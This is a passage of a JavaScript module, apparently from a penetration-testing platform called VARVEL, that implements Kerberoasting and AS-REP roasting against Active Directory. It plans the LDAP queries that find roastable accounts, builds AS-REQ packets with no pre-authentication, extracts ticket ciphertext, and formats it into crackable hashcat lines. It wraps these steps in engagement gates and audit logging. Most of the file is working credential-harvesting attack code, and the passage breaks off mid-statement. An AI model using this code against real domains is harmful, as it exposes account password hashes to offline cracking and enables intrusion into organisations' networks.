// VARVEL — the GOVERNED AD TIER, rung 1: ROAST COLLECTORS (PURE core).
//
// A company-PC breach is an Active Directory engagement. This module is the pure
// governance/format core of the two standard credential-exposure collectors every
// serious platform ships (Rubeus / Impacket GetUserSPNs+GetNPUsers):
//
//   KERBEROAST  — enumerate SPN-bearing accounts via LDAP, request their service
//                 tickets (RC4/AES etype-correct), format them hashcat/john-ready.
//                 The ticket REQUEST leg is the agent's (agents/varvel-agent.ps1
//                 ==ADROAST-LIB== — Windows integrated Kerberos does the crypto);
//                 this module plans the LDAP targeting, parses the returned
//                 AP-REQ bytes down to the ticket enc-part, and FORMATS.
//   ASREP-ROAST — DONT_REQ_PREAUTH accounts get an AS-REP for ANYONE who asks
//                 (no credentials, no crypto — a plain AS-REQ without padata).
//                 This module BUILDS the exact AS-REQ bytes (DER) and parses the
//                 AS-REP; the wire exchange rides an injectable connect (the
//                 tools/adroast.mjs shell) or the agent's raw-TCP leg.
//
// THE HONEST BOUNDARY, stated plainly: we COLLECT and FORMAT. Cracking is
// OFFLINE, operator-side tooling (hashcat/john on the operator's box) — never
// online, never brute-forced through the wire. The ticket requests themselves
// are NORMAL KERBEROS TRAFFIC (that is the tradecraft point — a TGS-REQ for an
// SPN is what every service ticket in the domain looks like); what the DEFENDER
// logged about them (DC Security 4768/4769, the agent host's own telemetry) is
// graded by the edrview oracle, never claimed. Every module doc carries the
// measured-not-claimed + edrview-pairing doctrine.
//
// FORMAT AUTHORITY (pinned by tests, not memory): the hashcat module field
// layouts — mode 13100 $krb5tgs$23$*user$realm$spn*$chk$edata2 (chk = FIRST 16
// bytes of the RC4-HMAC cipher), modes 19600/19700 $krb5tgs$17|18$user$realm$chk$
// edata2 (chk = LAST 12 bytes — the AES CTS-HMAC-SHA1-96 trailer), mode 18200
// $krb5asrep$23$user@realm:chk$edata2 (note the COLON), modes 32100/32200
// $krb5asrep$17|18$user$realm$chk$edata2. Canonical format-1 lines only.
//
// Governance (three seams, all fail-closed — mirrors engine/persist.mjs):
//   1. ENGAGEMENT GATE — settings key 'ad.roast' (default OFF). The channel
//      refuses to queue adroast-* unless the engagement explicitly enabled it;
//      the agent must ALSO have been launched with -AllowAdRoast. The DC target
//      must sit inside the signed CIDR ring when given as an IP (the channel's
//      scope check — out-of-ring is a loud GOVERNANCE refusal).
//   2. SPEC GATE — the task data must parse: known kind, dc/realm shape, capped
//      account/request lists, AS-REQ blobs structurally validated. Refused
//      BEFORE queueing.
//   3. AUDIT — a queued roast task emits 'adroast.task' with the sha256 of the
//      normalized SPEC (what was ordered, provably — request blobs carry random
//      nonces, so the pin is the ORDER: dc/realm/users/etypes, never the bytes).
//      Result intake emits 'adroast.collected' carrying the formatted hashes
//      (the collected crack-material — the engagement's deliverable, riding the
//      governed channel by design) plus per-account metadata for the attack-path
//      graph. Unparseable tickets land in errors[] honestly, never thrown.

import { createHash } from 'node:crypto';
import { Settings } from './settings.mjs';
import { tlv, readTlv, berSeq, berOctet, berInt, berEnum } from '../tools/ldapenum.mjs';

const sha256 = (buf) => createHash('sha256').update(buf).digest('hex');

export const ADROAST_KIND_ENUM = 'adroast-enum';
export const ADROAST_KIND_KERBEROAST = 'adroast-kerberoast';
export const ADROAST_KIND_ASREP = 'adroast-asrep';
export const ADROAST_KINDS = new Set([ADROAST_KIND_ENUM, ADROAST_KIND_KERBEROAST, ADROAST_KIND_ASREP]);

// Etype registry — the format-correct vocabulary. rc4-hmac splits checksum-first;
// the AES CTS-HMAC-SHA1-96 family carries its 12-byte HMAC as a TRAILER.
export const ADROAST_ETYPES = {
  23: { name: 'rc4-hmac', tgsMode: 13100, asrepMode: 18200, checksumBytes: 16, checksumAt: 'head' },
  17: { name: 'aes128-cts-hmac-sha1-96', tgsMode: 19600, asrepMode: 32100, checksumBytes: 12, checksumAt: 'tail' },
  18: { name: 'aes256-cts-hmac-sha1-96', tgsMode: 19700, asrepMode: 32200, checksumBytes: 12, checksumAt: 'tail' },
};
export const ADROAST_DEFAULT_ETYPES = [23, 17, 18];

const MAX_ACCOUNTS = 256;
const MAX_ASREQ_BYTES = 2048;
const MAX_FIELD = 300;

// ——— Kerberos DER helpers (the BER reader/writer is the ldapenum codec, reused) ———
// DER INTEGER for a non-negative int of any size (ldapenum's berInt covers ≤0xff;
// nonces and etypes need the real thing: minimal big-endian, 0x00-prefixed when the
// top bit would read as negative).
export function kerbInt(n) {
  n = Number(n);
  if (!Number.isSafeInteger(n) || n < 0) throw new TypeError('kerbInt: want a non-negative safe integer');
  if (n === 0) return tlv(0x02, Buffer.from([0]));
  const bytes = [];
  let v = n;
  while (v > 0) { bytes.unshift(v & 0xff); v = Math.floor(v / 256); }
  if (bytes[0] & 0x80) bytes.unshift(0);
  return tlv(0x02, Buffer.from(bytes));
}
const ctx = (n, inner) => tlv(0xa0 + n, inner);            // [n] EXPLICIT (constructed)
const gstr = (s) => tlv(0x1b, Buffer.from(String(s), 'utf8')); // KerberosString = GeneralString
const krbToInt = (v) => { let n = 0; for (const b of v) n = n * 256 + b; return n; };
// Kerberos strings arrive as GeneralString (0x1b, RFC 4120); tolerate IA5/UTF8 leniently.
const readString = (tlvObj) => {
  if (!tlvObj || ![0x1b, 0x16, 0x0c].includes(tlvObj.tag)) throw new Error('expected a Kerberos string (tag 0x1b)');
  return tlvObj.value.toString('utf8');
};

// PrincipalName ::= SEQUENCE { name-type[0] INTEGER, name-string[1] SEQUENCE OF KerberosString }
function buildPrincipalName(nameType, components) {
  return berSeq(
    ctx(0, kerbInt(nameType)),
    ctx(1, berSeq(...components.map(gstr))),
  );
}
function parsePrincipalName(seqValue) {
  let pos = 0;
  let nameType = null;
  const names = [];
  while (pos < seqValue.length) {
    const t = readTlv(seqValue, pos); pos = t.next;
    if (t.tag === 0xa0) nameType = krbToInt(readTlv(t.value, 0).value);
    else if (t.tag === 0xa1) {
      const list = readTlv(t.value, 0); // SEQUENCE OF
      let p = 0;
      while (p < list.value.length) { const s = readTlv(list.value, p); p = s.next; names.push(readString(s)); }
    }
  }
  return { nameType, names };
}

// EncryptedData ::= SEQUENCE { etype[0] INTEGER, kvno[1] INTEGER OPTIONAL, cipher[2] OCTET STRING }
function parseEncryptedData(seqValue) {
  let pos = 0;
  let etype = null, kvno = null, cipher = null;
  while (pos < seqValue.length) {
    const t = readTlv(seqValue, pos); pos = t.next;
    if (t.tag === 0xa0) etype = krbToInt(readTlv(t.value, 0).value);
    else if (t.tag === 0xa1) kvno = krbToInt(readTlv(t.value, 0).value);
    else if (t.tag === 0xa2) cipher = readTlv(t.value, 0).value; // OCTET STRING content
  }
  if (etype == null || !cipher) throw new Error('EncryptedData missing etype/cipher');
  return { etype, kvno, cipher };
}

// ——— THE AS-REQ BUILDER (ASREP-roast's only wire artifact — no creds, no crypto) ———
// AS-REQ ::= [APPLICATION 10] SEQUENCE { pvno[1]=5, msg-type[2]=10, req-body[4] }.
// padata[3] is DELIBERATELY ABSENT — that absence is the entire DONT_REQ_PREAUTH
// mechanic: the KDC answers with an AS-REP encrypted under the account's key for
// anyone who asks. kdc-options are the ordinary client flags any workstation sends.
export function buildAsReq({ user, realm, etypes = ADROAST_DEFAULT_ETYPES, nonce, till = '20370913024805Z' } = {}) {
  if (!user || !/^[A-Za-z0-9._@-]{1,104}$/.test(String(user))) throw new TypeError('buildAsReq: user must be a plain principal name');
  if (!realm || !/^[A-Za-z0-9.-]{2,200}$/.test(String(realm))) throw new TypeError('buildAsReq: realm must be a DNS-style realm');
  realm = String(realm).toUpperCase();
  if (!Array.isArray(etypes) || !etypes.length || etypes.some((e) => !ADROAST_ETYPES[e])) {
    throw new TypeError('buildAsReq: etypes must be a non-empty subset of ' + Object.keys(ADROAST_ETYPES).join(', '));
  }
  if (nonce === undefined) nonce = Math.floor(Math.random() * 0x7ffffff0) + 1;
  const reqBody = berSeq(
    ctx(0, tlv(0x03, Buffer.from([0x00, 0x40, 0x80, 0x00, 0x10]))), // kdc-options: the ordinary forwardable|renewable|canonicalize|renewable-ok flags
    ctx(1, buildPrincipalName(1, [user])),                            // cname: NT-PRINCIPAL
    ctx(2, gstr(realm)),                                              // realm
    ctx(3, buildPrincipalName(2, ['krbtgt', realm])),                 // sname: NT-SRV-INST krbtgt/REALM
    ctx(5, tlv(0x18, Buffer.from(till, 'ascii'))),                    // till: GeneralizedTime (the standard 2037 date)
    ctx(7, kerbInt(nonce)),                                           // nonce
    ctx(8, berSeq(...etypes.map(kerbInt))),                           // etype list, operator's preference order
  );
  return tlv(0x6a, berSeq( // [APPLICATION 10] AS-REQ
    ctx(1, kerbInt(5)),   // pvno
    ctx(2, kerbInt(10)),  // msg-type AS-REQ
    ctx(4, reqBody),
  ));
}

// ——— Kerberos message PARSING (AP-REQ from the agent's ticket requests; AS-REP /
// KRB-ERROR from the KDC exchange). Walk by tag, never by fixed offset (kvno and
// padata are optional). Throws on structural garbage — callers fail-closed. ———
function unwrapGssApi(buf) {
  if (buf[0] !== 0x60) return buf;
  const outer = readTlv(buf, 0);
  let pos = 0;
  const oid = readTlv(outer.value, pos); pos = oid.next; // the mech OID (kerberos 1.2.840.113554.1.2.2)
  return outer.value.subarray(pos); // the inner kerberos message TLV
}

// AP-REQ ::= [APPLICATION 14] { pvno[0], msg-type[1]=14, ap-options[2], ticket[3], authenticator[4] }
// Ticket  ::= [APPLICATION 1]  { tkt-vno[0], realm[1], sname[2], enc-part[3] EncryptedData }
// The agent's KerberosRequestorSecurityToken.GetRequest() returns exactly this
// (GSS-API framed): the AP-REQ carries THE service ticket, whose enc-part is the
// roast material (byte-identical to the TGS-REP's — same ticket, same cipher).
export function parseApReq(input) {
  const buf = unwrapGssApi(Buffer.isBuffer(input) ? input : Buffer.from(String(input), 'base64'));
  const head = readTlv(buf, 0);
  if (head.tag !== 0x6e) throw new Error('not an AP-REQ (want [APPLICATION 14], got tag 0x' + head.tag.toString(16) + ')');
  const seq = readTlv(head.value, 0); // SEQUENCE
  let pos = 0, ticketTlv = null;
  while (pos < seq.value.length) {
    const t = readTlv(seq.value, pos); pos = t.next;
    if (t.tag === 0xa3) ticketTlv = t;
  }
  if (!ticketTlv) throw new Error('AP-REQ carries no ticket[3]');
  const ticketApp = readTlv(ticketTlv.value, 0); // [APPLICATION 1] Ticket
  if (ticketApp.tag !== 0x61) throw new Error('ticket[3] does not wrap a Ticket (0x61)');
  const tseq = readTlv(ticketApp.value, 0);
  let tp = 0, realm = null, sname = null, enc = null;
  while (tp < tseq.value.length) {
    const t = readTlv(tseq.value, tp); tp = t.next;
    if (t.tag === 0xa1) realm = readString(readTlv(t.value, 0));
    else if (t.tag === 0xa2) sname = parsePrincipalName(readTlv(t.value, 0).value);
    else if (t.tag === 0xa3) enc = parseEncryptedData(readTlv(t.value, 0).value);
  }
  if (!realm || !sname || !enc) throw new Error('ticket missing realm/sname/enc-part');
  return { msgType: 14, realm, sname: sname.names, spn: sname.names.join('/'), etype: enc.etype, kvno: enc.kvno, cipher: enc.cipher };
}

// AS-REP ::= [APPLICATION 15] { pvno[0], msg-type[1]=15, padata[2] OPT, crealm[3],
// cname[4], ticket[5], enc-part[6] EncryptedData } — enc-part is the roast material.
export function parseAsRep(input) {
  const buf = unwrapGssApi(Buffer.isBuffer(input) ? input : Buffer.from(String(input), 'base64'));
  const head = readTlv(buf, 0);
  if (head.tag === 0x7e) { const e = parseKrbError(buf); const err = new Error('KRB-ERROR ' + e.errorCode + ' (' + e.name + ')'); err.krbError = e; throw err; }
  if (head.tag !== 0x6f) throw new Error('not an AS-REP (want [APPLICATION 15], got tag 0x' + head.tag.toString(16) + ')');
  const seq = readTlv(head.value, 0);
  let pos = 0, realm = null, cname = null, enc = null;
  while (pos < seq.value.length) {
    const t = readTlv(seq.value, pos); pos = t.next;
    if (t.tag === 0xa3) realm = readString(readTlv(t.value, 0));
    else if (t.tag === 0xa4) cname = parsePrincipalName(readTlv(t.value, 0).value);
    else if (t.tag === 0xa6) enc = parseEncryptedData(readTlv(t.value, 0).value);
  }
  if (!realm || !enc) throw new Error('AS-REP missing crealm/enc-part');
  return { msgType: 15, realm, cname: cname ? cname.names : [], user: cname && cname.names[0] || null, etype: enc.etype, kvno: enc.kvno, cipher: enc.cipher };
}

// KRB-ERROR ::= [APPLICATION 30] { ..., error-code[6] INTEGER, ... } — the honest
// outcomes: PREAUTH_REQUIRED (account is NOT roastable — skip it, say so),
// C_PRINCIPAL_UNKNOWN, ETYPE_NOSUPP, POLICY.
export const KRB_ERROR_NAMES = {
  6: 'KDC_ERR_C_PRINCIPAL_UNKNOWN', 12: 'KDC_ERR_POLICY', 14: 'KDC_ERR_ETYPE_NOSUPP',
  18: 'KDC_ERR_CLIENT_REVOKED', 23: 'KDC_ERR_KEY_EXPIRED', 25: 'KDC_ERR_PREAUTH_REQUIRED',
  37: 'KRB_AP_ERR_SKEW',
};
export function parseKrbError(input) {
  const buf = Buffer.isBuffer(input) ? input : Buffer.from(String(input), 'base64');
  const head = readTlv(buf, 0);
  if (head.tag !== 0x7e) throw new Error('not a KRB-ERROR (want [APPLICATION 30])');
  const seq = readTlv(head.value, 0);
  let pos = 0, errorCode = null, realm = null, cname = null;
  while (pos < seq.value.length) {
    const t = readTlv(seq.value, pos); pos = t.next;
    if (t.tag === 0xa3) realm = readString(readTlv(t.value, 0));
    else if (t.tag === 0xa4) { try { cname = parsePrincipalName(readTlv(t.value, 0).value).names[0] || null; } catch { cname = null; } }
    else if (t.tag === 0xa6) errorCode = krbToInt(readTlv(t.value, 0).value);
  }
  if (errorCode == null) throw new Error('KRB-ERROR carries no error-code');
  return { msgType: 30, errorCode, name: KRB_ERROR_NAMES[errorCode] || 'KDC_ERR_' + errorCode, realm, cname };
}

// ——— THE FORMATTERS (hashcat/john-ready, canonical format-1 lines, etype-correct) ———
// Split the EncryptedData cipher into (checksum, edata2) per the etype family:
// rc4-hmac (23) prefixes a 16-byte HMAC-MD5 MIC; the AES CTS-HMAC-SHA1-96 family
// (17/18) TRAILS a 12-byte HMAC-SHA1-96. Wrong split = an uncrackable line, so
// this is pinned by exact-string tests against constructed fixture tickets.
export function splitCipher(etype, cipher) {
  const reg = ADROAST_ETYPES[etype];
  if (!reg) throw new TypeError('etype ' + etype + ' has no known roast format (stage 1 ships ' + Object.keys(ADROAST_ETYPES).join('/') + ' — the line would not be hashcat-correct, so none is emitted)');
  const buf = Buffer.isBuffer(cipher) ? cipher : Buffer.from(cipher);
  const n = reg.checksumBytes;
  if (buf.length < n + 32) throw new RangeError('cipher too short for etype ' + etype + ' (' + buf.length + ' bytes — edata2 must be ≥32 hex-worthy bytes); refusing to emit a malformed line');
  return reg.checksumAt === 'head'
    ? { checksum: buf.subarray(0, n), edata2: buf.subarray(n) }
    : { checksum: buf.subarray(buf.length - n), edata2: buf.subarray(0, buf.length - n) };
}

const clean = (s, what, { allowColon = false } = {}) => {
  s = String(s ?? '');
  const ban = allowColon ? /[$*\r\n]/ : /[$*:\r\n]/;
  if (!s || s.length > MAX_FIELD || ban.test(s)) throw new TypeError(what + ' fails the hash-line field rules (no $ *' + (allowColon ? '' : ' :') + ' or newlines, ≤' + MAX_FIELD + ' chars): ' + JSON.stringify(s.slice(0, 40)));
  return s;
};

// Kerberoast line. user = the sAMAccountName the SPN maps to (from the LDAP enum —
// the AES modes derive the cracking salt as REALM+user, so the CASE-EXACT user is
// cryptographic input, not decoration). realm from the ticket itself. The SPN field
// legitimately carries ':' (svc/host:port) — it is '$'-delimited in every layout.
export function formatTgsHash({ user, realm, spn, etype, cipher }) {
  const reg = ADROAST_ETYPES[etype];
  if (!reg) throw new TypeError('etype ' + etype + ' has no known roast format');
  const { checksum, edata2 } = splitCipher(etype, cipher);
  user = clean(user, 'user'); realm = clean(realm, 'realm'); spn = clean(spn, 'spn', { allowColon: true });
  const hex = (b) => Buffer.from(b).toString('hex');
  if (etype === 23) return '$krb5tgs$23$*' + user + '$' + realm + '$' + spn + '*$' + hex(checksum) + '$' + hex(edata2);
  // AES canonical format-1 carries no SPN field (hashcat strips it on output); the
  // SPN stays in the evidence metadata for attribution.
  return '$krb5tgs$' + etype + '$' + user + '$' + realm + '$' + hex(checksum) + '$' + hex(edata2);
}

// ASREP line. etype 23 uses the user@realm: principal layout (the COLON is load-
// bearing); the AES family uses the user$realm layout.
export function formatAsrepHash({ user, realm, etype, cipher }) {
  const reg = ADROAST_ETYPES[etype];
  if (!reg) throw new TypeError('etype ' + etype + ' has no known roast format');
  const { checksum, edata2 } = splitCipher(etype, cipher);
  user = clean(user, 'user'); realm = clean(realm, 'realm');
  const hex = (b) => Buffer.from(b).toString('hex');
  if (etype === 23) return '$krb5asrep$23$' + user + '@' + realm + ':' + hex(checksum) + '$' + hex(edata2);
  return '$krb5asrep$' + etype + '$' + user + '$' + realm + '$' + hex(checksum) + '$' + hex(edata2);
}

// Full pipeline: agent-collected AP-REQ bytes -> parsed ticket -> formatted line.
// user comes from the enum mapping (SPN -> sAMAccountName); realm/spn from the ticket.
export function roastTicket({ user, spn, bytes }) {
  const t = parseApReq(bytes);
  const reg = ADROAST_ETYPES[t.etype];
  const hash = formatTgsHash({ user, realm: t.realm, spn: spn || t.spn, etype: t.etype, cipher: t.cipher });
  return { kind: 'krb5tgs', user: String(user), realm: t.realm, spn: spn || t.spn, etype: t.etype, etypeName: reg.name, hashcatMode: reg.tgsMode, hash };
}

// Full pipeline for an AS-REP exchange result.
export function asrepTicket({ user, realm, bytes }) {
  const r = parseAsRep(bytes);
  const reg = ADROAST_ETYPES[r.etype];
  const hash = formatAsrepHash({ user: user || r.user, realm: realm || r.realm, etype: r.etype, cipher: r.cipher });
  return { kind: 'krb5asrep', user: String(user || r.user), realm: realm || r.realm, spn: null, etype: r.etype, etypeName: reg.name, hashcatMode: reg.asrepMode, hash };
}

// ——— THE LDAP-TARGETING PLANNER (pure: the exact filter + attribute plan both
// collection legs execute — the Node shell (tools/adroast.mjs, reusing the ldapenum
// BER plumbing) and the agent's DirectorySearcher leg take the SAME plan). ———
// LDAP_MATCHING_RULE_BIT_AND (1.2.840.113556.1.4.803): DONT_REQ_PREAUTH = 4194304,
// ACCOUNTDISABLE = 2.
export const ADROAST_UAC = { ACCOUNTDISABLE: 2, DONT_REQ_PREAUTH: 4194304 };
export const ADROAST_BIT_AND_OID = '1.2.840.113556.1.4.803';

export function planLdapTargeting(which) {
  if (which === 'spn-accounts') {
    return {
      which, scope: 'subtree',
      filter: '(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:' + ADROAST_BIT_AND_OID + ':=' + ADROAST_UAC.ACCOUNTDISABLE + ')))',
      attributes: ['sAMAccountName', 'servicePrincipalName', 'adminCount', 'userAccountControl', 'memberOf'],
      note: 'kerberoast targeting: enabled user accounts bearing at least one SPN. adminCount/memberOf feed the DA-class attribution in the attack-path graph (adminCount is a HEURISTIC — said as such).',
    };
  }
  if (which === 'no-preauth-accounts') {
    return {
      which, scope: 'subtree',
      filter: '(&(objectClass=user)(userAccountControl:' + ADROAST_BIT_AND_OID + ':=' + ADROAST_UAC.DONT_REQ_PREAUTH + ')(!(userAccountControl:' + ADROAST_BIT_AND_OID + ':=' + ADROAST_UAC.ACCOUNTDISABLE + ')))',
      attributes: ['sAMAccountName', 'adminCount', 'userAccountControl', 'memberOf'],
      note: 'ASREP-roast targeting: enabled user accounts with DONT_REQ_PREAUTH set — an AS-REQ without padata is answered for these by any unauthenticated asker.',
    };
  }
  throw new TypeError('planLdapTargeting: unknown class ' + JSON.stringify(which) + ' (want spn-accounts | no-preauth-accounts)');
}

// BER filter encoder for the plan's filter string — a deliberately small recursive
// parser for the exact filter shapes this module PLANS (and, or, not, present,
// equality, extensibleMatch bit-AND). Refuses anything outside that grammar: the
// channel ships only filters this module could have planned.
export function buildLdapFilterBytes(filter) {
  const s = String(filter || '');
  let pos = 0;
  const peek = () => s[pos];
  const expect = (ch) => { if (s[pos] !== ch) throw new Error('filter parse: expected ' + JSON.stringify(ch) + ' at ' + pos + ' of ' + JSON.stringify(s)); pos++; };
  const readToken = (stopRe) => {
    let out = '';
    while (pos < s.length && !stopRe.test(s[pos])) out += s[pos++];
    if (!out) throw new Error('filter parse: empty token at ' + pos);
    return out;
  };
  const parseOne = () => {
    expect('(');
    const ch = peek();
    if (ch === '&' || ch === '|') {
      pos++;
      const parts = [];
      while (peek() === '(') parts.push(parseOne());
      expect(')');
      return tlv(ch === '&' ? 0xa0 : 0xa1, Buffer.concat(parts));
    }
    if (ch === '!') { pos++; const inner = parseOne(); expect(')'); return tlv(0xa2, inner); }
    const attr = readToken(/[=~:>]/);
    if (peek() === ':') { // extensibleMatch: attr:OID:=value  (the bit-AND rule)
      pos++; const rule = readToken(/:/); expect(':'); expect('='); const value = readToken(/\)/); expect(')');
      if (!/^\d+(\.\d+)*$/.test(rule)) throw new Error('filter parse: extensibleMatch rule must be a numeric OID');
      return tlv(0xa9, Buffer.concat([tlv(0x81, Buffer.from(rule)), tlv(0x82, Buffer.from(attr)), tlv(0x83, Buffer.from(value))]));
    }
    expect('=');
    const value = readToken(/\)/);
    expect(')');
    if (value === '*') return tlv(0x87, Buffer.from(attr)); // present
    return tlv(0xa3, berSeq(berOctet(attr), berOctet(value))); // equalityMatch
  };
  const out = parseOne();
  if (pos !== s.length) throw new Error('filter parse: trailing garbage at ' + pos);
  return out;
}

// A full LDAP SearchRequest for a targeting plan (subtree under baseDN), built on
// the ldapenum codec. The shell (tools/adroast.mjs) sends it; tests pin the shape.
export function buildRoastSearchRequest(messageId, baseDN, plan, { sizeLimit = MAX_ACCOUNTS, timeLimit = 20 } = {}) {
  const body = Buffer.concat([
    berOctet(String(baseDN || '')),
    berEnum(2),                 // scope: wholeSubtree
    berEnum(0),                 // derefAliases: never
    berInt(sizeLimit),
    berInt(timeLimit),
    tlv(0x01, Buffer.from([0])), // typesOnly: false
    buildLdapFilterBytes(plan.filter),
    berSeq(...plan.attributes.map(berOctet)),
  ]);
  return berSeq(berInt(messageId), tlv(0x63, body));
}

// ——— SPEC GATE (the same parse runs pre-queue channel-side and pre-exec agent-side) ———
const DC_RE = /^[A-Za-z0-9._-]{1,253}$/; // IP literal or DNS name (scope is the channel's check)
const REALM_RE = /^[A-Za-z0-9.-]{2,200}$/;
const USER_RE = /^[A-Za-z0-9._@-]{1,104}$/;
const SPN_RE = /^[A-Za-z0-9][A-Za-z0-9._\/:@-]{1,200}$/;

export function parseAdRoastSpec(kind, data) {
  kind = String(kind || '');
  if (!ADROAST_KINDS.has(kind)) throw new TypeError('adroast: unknown kind ' + JSON.stringify(kind) + ' (want one of ' + [...ADROAST_KINDS].join(', ') + ')');
  const raw = String(data ?? '').trim();
  let spec;
  try { spec = JSON.parse(raw); } catch {
    throw new TypeError(kind + ': task data is not valid JSON (want {"dc":"<dc-ip>","realm":"CORP.LOCAL"})');
  }
  if (!spec || typeof spec !== 'object' || Array.isArray(spec)) throw new TypeError(kind + ': task data must be a JSON object');
  const dc = String(spec.dc || '').trim();
  if (!DC_RE.test(dc)) throw new TypeError(kind + ': dc must be a DC hostname or IP literal (the channel additionally refuses it when it is an IP outside the signed CIDR ring)');
  const realm = spec.realm == null ? null : String(spec.realm).trim().toUpperCase();
  if (realm !== null && !REALM_RE.test(realm)) throw new TypeError(kind + ': realm must be a DNS-style realm (e.g. CORP.LOCAL)');
  const out = { kind, dc, realm };
  // Optional operator-supplied LDAP bind creds for the enum leg (the agent's own
  // logon context is the default). SECRET: ldapPassword rides the task data to the
  // agent over the governed channel ONLY — the audit pin (adRoastSpecSha256 pins
  // kind/dc/realm/users) and every event never include it.
  for (const f of ['ldapUser', 'ldapDomain']) {
    if (spec[f] !== undefined && spec[f] !== null && String(spec[f]).trim() !== '') {
      const v = String(spec[f]).trim();
      if (v.length > 260) throw new RangeError(kind + ': ' + f + ' exceeds the 260-char cap');
      out[f] = v;
    }
  }
  if (spec.ldapPassword !== undefined && spec.ldapPassword !== null) out.ldapPassword = String(spec.ldapPassword).slice(0, 400);
  if (kind === ADROAST_KIND_ENUM) return out;
  if (kind === ADROAST_KIND_KERBEROAST) {
    let accounts = null;
    if (spec.accounts !== undefined) {
      if (!Array.isArray(spec.accounts)) throw new TypeError(kind + ': accounts must be an array of {"user","spn"}');
      if (spec.accounts.length > MAX_ACCOUNTS) throw new RangeError(kind + ': ' + spec.accounts.length + ' accounts is over the ' + MAX_ACCOUNTS + ' cap');
      accounts = spec.accounts.map((a) => {
        const user = String((a && a.user) || '').trim();
        const spn = String((a && a.spn) || '').trim();
        if (!USER_RE.test(user)) throw new TypeError(kind + ': account user fails the principal-name shape: ' + JSON.stringify(user.slice(0, 40)));
        if (!SPN_RE.test(spn) || !spn.includes('/')) throw new TypeError(kind + ': account spn fails the SPN shape (svc/host): ' + JSON.stringify(spn.slice(0, 40)));
        return { user, spn };
      });
      // dedupe by spn
      const seen = new Set();
      accounts = accounts.filter((a) => (seen.has(a.spn.toLowerCase()) ? false : (seen.add(a.spn.toLowerCase()), true)));
    }
    out.accounts = accounts; // null = the agent enumerates first, then requests
    return out;
  }
  // adroast-asrep: the engine pre-builds the AS-REQ bytes (DER correctness lives in
  // TESTED Node code); the agent leg is a raw-TCP splat to the DC + response capture.
  if (!realm) throw new TypeError(kind + ': realm is required (the AS-REQ embeds it — no realm, no well-formed request)');
  if (!Array.isArray(spec.requests) || !spec.requests.length) throw new TypeError(kind + ': requests must be a non-empty array of {"user","asreqB64"} (build them with buildAsReq — the engine owns the DER)');
  if (spec.requests.length > MAX_ACCOUNTS) throw new RangeError(kind + ': ' + spec.requests.length + ' requests is over the ' + MAX_ACCOUNTS + ' cap');
  out.requests = spec.requests.map((r) => {
    const user = String((r && r.user) || '').trim();
    if (!USER_RE.test(user)) throw new TypeError(kind + ': request user fails the principal-name shape: ' + JSON.stringify(user.slice(0, 40)));
    let bytes;
    try { bytes = Buffer.from(String((r && r.asreqB64) || ''), 'base64'); } catch { bytes = null; }
    if (!bytes || !bytes.length || bytes.length > MAX_ASREQ_BYTES) throw new TypeError(kind + ': asreqB64 for ' + JSON.stringify(user) + ' is missing or over the ' + MAX_ASREQ_BYTES + '-byte cap');
    if (bytes[0] !== 0x6a) throw new TypeError(kind + ': asreqB64 for ' + JSON.stringify(user) + ' is not an AS-REQ (want [APPLICATION 10] — build it with buildAsReq, never hand-rolled agent-side)');
    return { user, asreqB64: bytes.toString('base64') };
  });
  return out;
}

// The engagement gate. Fail-CLOSED on any settings-layer error.
export function adRoastGate(engagement) {
  let on = false;
  try { on = Settings.for(engagement || 'default').get('ad.roast') === true; } catch { on = false; }
  if (!on) {
    return {
      ok: false,
      reason: "engagement setting 'ad.roast' is OFF — the AD roast collector tier is disabled. "
        + "An operator must explicitly enable it for engagement '" + (engagement || 'default') + "' "
        + "(POST /api/settings {key:'ad.roast', value:true}) before adroast tasks will queue, and the agent must "
        + "have been launched with its own roast flag. No LDAP targeting ran, no ticket was requested.",
    };
  }
  return { ok: true };
}

// The sha256 of the normalized spec — pinned into 'adroast.task' at queue time. The
// AS-REQ blobs carry random nonces, so the pin is the ORDER (dc/realm/users/etypes),
// never the request bytes.
export function adRoastSpecSha256(spec) {
  const users = (spec.requests || spec.accounts || null);
  return sha256(JSON.stringify({
    kind: spec.kind, dc: String(spec.dc || '').toLowerCase(), realm: spec.realm ? String(spec.realm).toUpperCase() : null,
    users: users ? users.map((r) => (r.user + (r.spn ? '|' + r.spn.toLowerCase() : ''))).sort() : null,
  }));
}

// ——— INTAKE: agent result body -> the audit event. The FORMAT PIPELINE RUNS HERE —
// channel-side, in tested Node: the agent ships raw ticket bytes, this module parses
// and formats. Per-ticket failures land in errors[] (a KRB-ERROR, an unsupported
// etype, a truncated AP-REQ) — never thrown, never fabricated. ———
export function parseAdRoastEvidence(body) {
  let p;
  try { p = JSON.parse(String(body || '')); } catch { return null; }
  if (!p || typeof p !== 'object' || typeof p.op !== 'string') return null;
  if (!['enum', 'kerberoast', 'asrep'].includes(p.op)) return null;
  const accounts = Array.isArray(p.accounts) ? p.accounts.filter((a) => a && typeof a === 'object').map((a) => ({
    user: String(a.user || ''), spns: Array.isArray(a.spns) ? a.spns.map(String).slice(0, 64) : [],
    adminCount: a.adminCount === 1 || a.adminCount === '1' ? 1 : 0,
    daClass: a.daClass === true, groups: Array.isArray(a.groups) ? a.groups.map(String).slice(0, 16) : [],
  })).filter((a) => a.user) : [];
  const hashes = [];
  const errors = Array.isArray(p.errors) ? p.errors.map(String).slice(0, 32) : [];
  if (p.op === 'kerberoast' && Array.isArray(p.tickets)) {
    for (const t of p.tickets) {
      if (!t || typeof t !== 'object') continue;
      if (t.error) { errors.push(String(t.user || '?') + '/' + String(t.spn || '?') + ': ' + String(t.error).slice(0, 160)); continue; }
      try { hashes.push(roastTicket({ user: t.user, spn: t.spn, bytes: t.apreqB64 })); }
      catch (e) { errors.push(String((t && t.user) || '?') + ': ticket unformattable — ' + ((e && e.message) || e)); }
    }
  }
  if (p.op === 'asrep' && Array.isArray(p.reps)) {
    for (const t of p.reps) {
      if (!t || typeof t !== 'object') continue;
      if (t.error) { errors.push(String(t.user || '?') + ': ' + String(t.error).slice(0, 160)); continue; }
      try { hashes.push(asrepTicket({ user: t.user, realm: p.realm ? String(p.realm) : null, bytes: t.asrepB64 })); }
      catch (e) { errors.push(String((t && t.user) || '?') + ': AS-REP unformattable — ' + ((e && e.message) || e)); }
    }
  }
  return {
    event: 'adroast.collected',
    fields: {
      op: p.op, dc: p.dc ? String(p.dc) : null, realm: p.realm ? String(p.realm).toUpperCase() : null, pid: p.pid ?? null,
      accountCount: accounts.length, accounts,
      hashCount: hashes.length, hashes,
      errors,
      note: hashes.length
